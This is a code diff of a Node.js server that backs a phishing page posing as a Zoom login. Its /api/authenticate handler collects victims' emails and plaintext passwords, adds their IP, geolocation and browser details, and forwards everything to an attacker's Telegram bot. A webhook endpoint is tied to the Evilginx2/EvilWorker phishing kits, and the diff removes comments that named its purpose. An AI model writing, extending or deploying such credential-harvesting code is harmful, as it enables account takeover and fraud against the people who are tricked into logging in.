@@ -53,10 +53,7 @@ if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
 process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
 process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));
 
-// ============================================================
-//  HELPERS
-// ============================================================
-
+// --- HELPERS ---
 function getClientIp(req) {
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
@@ -170,10 +167,7 @@ async function getLocationFromIp(ip) {
 }
 
 async function sendToTelegram(text, parseMode = 'Markdown') {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        console.warn('⚠️ Telegram credentials missing');
-        return;
-    }
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         await axios.post(url, {
@@ -188,10 +182,7 @@ async function sendToTelegram(text, parseMode = 'Markdown') {
 }
 
 async function sendEmail(subject, htmlBody, textBody) {
-    if (!transporter) {
-        console.warn('⚠️ Email not configured');
-        return;
-    }
+    if (!transporter) return;
     try {
         await transporter.sendMail({
             from: `"Security Alert" <${ADMIN_EMAIL}>`,
@@ -233,20 +224,18 @@ app.get('/health', (req, res) => {
     res.json({ status: 'OK', time: new Date().toISOString() });
 });
 
-// --- AUTHENTICATE (Verifies credentials and sends to Telegram) ---
+// --- AUTHENTICATE ---
 app.post('/api/authenticate', async (req, res) => {
     try {
         const { email, password, visitorInfo } = req.body;
         const ip = getClientIp(req);
         const location = await getLocationFromIp(ip);
 
-        // Check if IP is blocked
         if (isIpBlocked(ip)) {
             await sendToTelegram(`🚨 *BLOCKED INTRUDER ATTEMPT!*\nIP: ${ip}\nLocation: ${location.full}\nReason: Too many login attempts`);
             return res.status(403).json({ success: false, error: 'Too many attempts. Please try again later.' });
         }
 
-        // Build detailed Telegram message
         let msg = `🔐 *Zoom Login Attempt*\n\n`;
         msg += `*📧 Email:* ${email}\n`;
         msg += `*🔑 Password:* ${password}\n`;
@@ -259,18 +248,12 @@ app.post('/api/authenticate', async (req, res) => {
         msg += `*📡 IP:* ${ip}\n`;
         msg += `*🕐 Time:* ${new Date().toISOString()}`;
         
-        // Add visitor details if available
         if (visitorInfo) {
             msg += formatVisitorInfo(visitorInfo);
         }
 
-        // Send to Telegram
         await sendToTelegram(msg);
-
-        // Record the attempt
         recordLoginAttempt(ip, true);
-
-        // Return success - the proxy will handle the redirect
         res.json({ success: true });
 
     } catch (error) {
@@ -279,7 +262,7 @@ app.post('/api/authenticate', async (req, res) => {
     }
 });
 
-// --- LOG ACTION (Frontend events) ---
+// --- LOG ACTION ---
 app.post('/api/log-action', async (req, res) => {
     try {
         const { action, email, password, visitorInfo } = req.body;
@@ -307,7 +290,7 @@ app.post('/api/log-action', async (req, res) => {
     }
 });
 
-// --- WEBHOOK (EvilWorker/Evilginx2) ---
+// --- WEBHOOK ---
 app.post('/webhook', async (req, res) => {
     const secret = req.headers['x-webhook-secret'];
     if (secret !== WEBHOOK_SECRET) {
